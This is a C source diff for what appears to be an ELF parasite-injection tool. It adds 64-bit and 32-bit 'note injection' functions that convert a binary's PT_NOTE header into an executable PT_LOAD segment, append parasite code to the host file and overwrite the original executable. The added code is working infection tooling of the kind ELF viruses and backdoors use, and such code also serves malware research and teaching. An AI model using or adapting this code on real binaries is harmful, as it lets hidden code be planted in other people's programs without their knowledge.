@@ -428,6 +428,199 @@ uint64_t reverse_inject_64(Elfit_t *host, Elfit_t *parasite)
     return textaddr + sizeof(Elf64_Ehdr);
 }
 
+/* Note injection: finds the first NOTE program header and turns it into another LOAD header for code
+Idea from Jacopo Corbetta
+*/
+uint64_t note_inject_64(Elfit_t *host, Elfit_t *parasite)
+{
+    Elf64_Ehdr *ehdr;
+    Elf64_Phdr *phdr;
+    Elf64_Shdr *shdr;
+    Elf64_Addr textaddr;
+    size_t psize;
+    int ppages;
+    int ofd;
+    int wrote;
+    int i;
+    int has_note;
+    uint64_t max_load_addr;
+    uint64_t inject_addr;
+    uint64_t padded_host_size;
+
+    psize = parasite->file->st_size;
+    ppages = psize / PAGE_SIZE;
+    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;
+
+    ehdr = (Elf64_Ehdr *) host->mem;
+    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);
+
+    /* Find the max address of any load segment */
+    max_load_addr = 0;
+    for (i=0;i<ehdr->e_phnum;i++, phdr++)
+    {
+        if ((phdr->p_type==PT_LOAD))
+        {
+            if (phdr->p_vaddr + phdr->p_memsz > max_load_addr)
+            {
+                max_load_addr = phdr->p_vaddr + phdr->p_memsz;
+            }
+        }
+    }
+
+    /* round up to get the inject addr */
+    inject_addr = (max_load_addr + PAGE_SIZE - 1) / PAGE_SIZE * PAGE_SIZE;
+    padded_host_size = (host->file->st_size + PAGE_SIZE -1) / PAGE_SIZE * PAGE_SIZE;
+
+    /* Make a note section point there */
+    has_note = 0;
+    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);
+    for (i=0;i<ehdr->e_phnum;i++, phdr++)
+    {
+        if ((phdr->p_type==PT_NOTE))
+        {
+            phdr->p_type = PT_LOAD;
+            phdr->p_flags = (PF_R | PF_X);
+            phdr->p_vaddr = phdr->p_paddr = inject_addr;
+            phdr->p_filesz = phdr->p_memsz = psize;
+            phdr->p_align = 1; /* Not sure if it matters or not */
+            phdr->p_offset = padded_host_size;
+            has_note = 1;
+            break;
+        }
+    }
+    if (!has_note)
+    {
+        perror("no note");
+        exit(1);
+    }
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
+    {
+        perror("new host");
+        exit(1);
+    }
+
+    /* write ELF */
+    if ((wrote = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("writing elf");
+        exit(1);
+    }
+
+    /* pad */
+    if (lseek(ofd, padded_host_size - host->file->st_size, SEEK_CUR) == -1)
+    {
+        perror("lseek");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
+    {
+        perror("writing parasite");
+        exit(1);
+    }
+
+    rename(TMP, host->name);
+    close(ofd);
+
+    return inject_addr;
+}
+
+uint32_t note_inject_32(Elfit_t *host, Elfit_t *parasite)
+{
+    Elf32_Ehdr *ehdr;
+    Elf32_Phdr *phdr;
+    Elf32_Shdr *shdr;
+    Elf32_Addr textaddr;
+    size_t psize;
+    int ppages;
+    int ofd;
+    int wrote;
+    int i;
+    int has_note;
+    uint32_t max_load_addr;
+    uint32_t inject_addr;
+    uint32_t padded_host_size;
+
+    psize = parasite->file->st_size;
+    ppages = psize / PAGE_SIZE;
+    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;
+
+    ehdr = (Elf32_Ehdr *) host->mem;
+    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);
+
+    /* Find the max address of any load segment */
+    max_load_addr = 0;
+    for (i=0;i<ehdr->e_phnum;i++, phdr++)
+    {
+        if ((phdr->p_type==PT_LOAD))
+        {
+            if (phdr->p_vaddr + phdr->p_memsz > max_load_addr)
+            {
+                max_load_addr = phdr->p_vaddr + phdr->p_memsz;
+            }
+        }
+    }
+
+    /* round up to get the inject addr */
+    inject_addr = (max_load_addr + PAGE_SIZE - 1) / PAGE_SIZE * PAGE_SIZE;
+    padded_host_size = (host->file->st_size + PAGE_SIZE -1) / PAGE_SIZE * PAGE_SIZE;
+
+    /* Make a note section point there */
+    has_note = 0;
+    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);
+    for (i=0;i<ehdr->e_phnum;i++, phdr++)
+    {
+        if ((phdr->p_type==PT_NOTE))
+        {
+            phdr->p_type = PT_LOAD;
+            phdr->p_flags = (PF_R | PF_X);
+            phdr->p_vaddr = phdr->p_paddr = inject_addr;
+            phdr->p_filesz = phdr->p_memsz = psize;
+            phdr->p_align = 1; /* Not sure if it matters or not */
+            phdr->p_offset = padded_host_size;
+            has_note = 1;
+            break;
+        }
+    }
+    if (!has_note)
+    {
+        perror("no note");
+        exit(1);
+    }
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
+    {
+        perror("new host");
+        exit(1);
+    }
+
+    /* write ELF */
+    if ((wrote = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("writing elf");
+        exit(1);
+    }
+
+    /* pad */
+    if (lseek(ofd, padded_host_size - host->file->st_size, SEEK_CUR) == -1)
+    {
+        perror("lseek");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
+    {
+        perror("writing parasite");
+        exit(1);
+    }
+
+    rename(TMP, host->name);
+    close(ofd);
+
+    return inject_addr;
+}
+
 /* DATA SEGMENT INJECTION - a messy implementation that really messes up the section
  * headers. This will inject successfully, and in all tests the binary will still run,
  * but this is definitely a work in progress */
